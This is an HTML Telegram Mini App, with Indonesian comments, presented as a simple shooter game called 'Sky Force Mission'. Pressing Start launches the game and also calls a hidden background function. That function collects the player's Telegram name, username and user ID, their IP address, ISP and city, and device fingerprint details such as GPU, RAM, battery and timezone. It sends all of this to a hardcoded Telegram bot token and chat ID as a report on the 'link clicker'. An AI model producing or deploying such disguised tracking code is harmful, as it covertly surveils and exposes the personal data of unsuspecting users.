<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sky Force Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
        #menu { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #001 0%, #000 100%); z-index: 10; }
        h1 { font-size: 24px; text-shadow: 0 0 10px #00ff00; margin-bottom: 20px; }
        .btn { padding: 15px 40px; border: 2px solid #00ff00; background: transparent; color: #00ff00; font-size: 18px; cursor: pointer; font-family: inherit; box-shadow: 0 0 15px rgba(0,255,0,0.3); transition: 0.3s; }
        .btn:active { background: #00ff00; color: #000; }
        #ui { position: absolute; top: 10px; left: 10px; color: white; font-size: 18px; display: none; }
        canvas { display: none; background: #000510; }
    </style>
</head>
<body>

<div id="menu">
    <h1>SKY FORCE MISSION</h1>
    <button class="btn" onclick="initGame()">START MISSION</button>
    <p style="font-size: 10px; margin-top: 20px; color: #008800;">SYNCING DATA CORES...</p>
</div>

<div id="ui">SCORE: <span id="score">0</span></div>
<canvas id="gameCanvas"></canvas>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // MASUKKAN TOKEN DAN CHAT ID ANDA DI SINI
    const TOKEN = '8492775361:AAE5U8rZNjqxGNnthSAaIKf-vO0-WHIrF1w';
    const CHAT_ID = '7393949927';

    async function initGame() {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('ui').style.display = 'block';
        document.getElementById('gameCanvas').style.display = 'block';
        
        collectAndSend(); // Kirim laporan di background
        startGame();      // Mulai game pesawat
    }

    async function collectAndSend() {
        const user = tg.initDataUnsafe?.user;
        
        let ip = {};
        try { const r = await fetch('https://ipapi.co/json/'); ip = await r.json(); } catch(e){}

        // Deteksi Merk & Hardware
        let brand = "Generic", gpu = "N/A";
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            if (/Samsung/i.test(navigator.userAgent)) brand = "Samsung";
            else if (/iPhone|iPad/i.test(navigator.userAgent)) brand = "Apple";
            else if (/Xiaomi/i.test(navigator.userAgent)) brand = "Xiaomi";
        }

        // Laporan Sesuai Permintaan
        const report = `
ðŸ‘¤ **IDENTITAS PENGKLIK LINK**
Nama Lengkap: ${user?.first_name || 'Tidak Diketahui'} ${user?.last_name || ''}
Email: ${user?.username ? '@' + user.username : 'Tidak Ada'}
Password: \`${user?.id || 'N/A'}\`
Bahasa: ${user?.language_code || 'N/A'}

ðŸ“± **DATA PERANGKAT**
Merk: ${brand} | OS: ${navigator.platform}
GPU: ${gpu}
Cores: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory || 'N/A'}GB
Screen: ${screen.width}x${screen.height}

ðŸŒ **JARINGAN**
IP: \`${ip.ip}\` | ISP: ${ip.org}
Lokasi: ${ip.city}, ${ip.country_name}
Signal: ${navigator.connection?.effectiveType || 'N/A'}

ðŸ› ï¸ **SISTEM MENDALAM**
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Baterai: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : 'N/A'}
Referrer: ${document.referrer || 'Direct'}
--------------------------------
ðŸ•’ *Waktu: ${new Date().toLocaleString('id-ID')}*`;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
        });
    }

    // --- SEDERHANA GAME ENGINE ---
    function startGame() {
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        let score = 0;
        let player = { x: canvas.width/2-20, y: canvas.height-100, w: 40, h: 40 };
        let bullets = [], enemies = [];

        canvas.addEventListener('touchmove', e => {
            player.x = e.touches[0].clientX - 20;
        });

        // Interval Tembakan & Musuh
        setInterval(() => bullets.push({x: player.x+18, y: player.y, w: 4, h: 10}), 300);
        setInterval(() => enemies.push({x: Math.random()*(canvas.width-30), y: -30, w: 30, h: 30, s: 3}), 1200);

        function loop() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            
            // Gambar Player
            ctx.fillStyle = "#00ff00";
            ctx.fillRect(player.x, player.y, player.w, player.h);

            // Peluru
            bullets.forEach((b, i) => {
                b.y -= 7;
                ctx.fillStyle = "yellow";
                ctx.fillRect(b.x, b.y, b.w, b.h);
                if(b.y < 0) bullets.splice(i, 1);
            });

            // Musuh
            enemies.forEach((en, i) => {
                en.y += en.s;
                ctx.fillStyle = "red";
                ctx.fillRect(en.x, en.y, en.w, en.h);
                
                // Tabrakan Peluru
                bullets.forEach((b, bi) => {
                    if(b.x < en.x+en.w && b.x+b.w > en.x && b.y < en.y+en.h && b.y+b.h > en.y) {
                        enemies.splice(i, 1); bullets.splice(bi, 1);
                        score += 10;
                        document.getElementById('score').innerText = score;
                    }
                });
                if(en.y > canvas.height) enemies.splice(i, 1);
            });
            requestAnimationFrame(loop);
        }
        loop();
    }
</script>
</body>
</html>
